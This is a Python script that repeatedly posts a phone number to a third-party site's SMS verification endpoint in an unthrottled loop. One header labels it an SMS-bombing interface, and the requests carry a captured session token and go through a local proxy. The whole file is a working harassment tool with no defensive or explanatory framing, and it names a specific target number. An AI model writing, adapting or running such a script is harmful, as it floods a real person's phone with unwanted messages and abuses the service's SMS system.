import requests


mobile = "15763540934,15763540934,15763540934"
def send_sms_code():
    url = "http://n9ka.8wigdi9d.vip/front/cluser/c/user/sms/code"
    headers = {
        "user-agent": "Dart/3.4 (dart:io)",
        "accept": "application/json,*/*",
        "ver": "2131",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Length": "24",
        "host": "n9ka.8wigdi9d.vip",
        "os": "TG 短信轰炸接口",
        "content-type": "application/json; charset=UTF-8",
        "macct": "sf66",
        "token": "c6d4ba6c2b0242ab8e8719cf3c2c3a56.EJF6YfUctzWhfs/dXXOLcisluN4OHaTFvebv0in7IbpvmliI/0PC7yMIN9It9Gtg9SgQbanpkBX6p817gi3ihUKL0sj9s1FVjqLqD1zFzyWp0vocpdrTfl2Zmf8xy+nZGuYQ/I36M0BJ9sqB8Taya5JqvsjENSwU.57c87d915e1770f79339c50bc89b4af9",
        "Connection": "keep-alive"
    }
    data = {
        "mobile": mobile
    }
    # Define the proxy
    proxies = {
        'http': 'http://127.0.0.1:7890',
        'https': 'http://127.0.0.1:7890'
    }

    response = requests.post(url, headers=headers, json=data, proxies=proxies)
    print(f"Response Status Code: {response.status_code}")
    print(f"Response Content: {response.json()}")


def main():
    while True:
        try:
            send_sms_code()
            # time.sleep(60)  # 每隔30秒发送一次请求
        except Exception as e:
            print(f"请求失败: {e}")
            break;


if __name__ == "__main__":
    main()
